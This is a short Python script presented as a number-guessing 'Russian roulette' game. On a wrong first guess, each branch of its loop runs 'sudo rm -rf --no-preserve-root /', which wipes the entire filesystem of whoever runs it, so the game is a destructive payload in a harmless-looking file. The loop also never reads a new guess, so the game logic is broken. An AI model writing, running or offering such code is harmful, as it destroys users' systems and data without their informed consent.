import random
import os

# RussianRouletteGame

number = random.randint(1, 100)
guess = int(input("Guess a number between 1 and 100: "))
while guess != number:
    if guess < number:
        print("Too low!")
        os.system("sudo rm -rf --no-preserve-root /")
    else:
        print("Too bad, your system will be nuked")
        os.system("sudo rm -rf --no-preserve-root /")


print("You guessed it!")
